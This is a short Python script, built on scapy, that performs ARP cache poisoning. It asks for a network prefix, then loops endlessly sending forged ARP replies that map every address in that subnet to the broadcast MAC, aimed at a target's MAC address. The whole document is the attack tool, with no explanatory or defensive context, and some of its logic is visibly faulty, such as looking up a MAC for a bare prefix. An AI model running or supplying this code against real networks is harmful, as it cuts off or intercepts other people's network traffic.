from scapy.all import Ether, srp, ARP, send

def getMac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
        
print("8.8.8.8/24 -> 8.8.8.")
targetip = input("network : ")
targetmac = getMac(targetip)
i = 0
while (True):
    ip = targetip + str(i)
    send(ARP(op=2, psrc=ip, pdst="8.8.8.8", hwdst=targetmac, hwsrc="ff:ff:ff:ff:ff:ff"), verbose=0)
    if (i > 255):
        i = 0
    i += 1
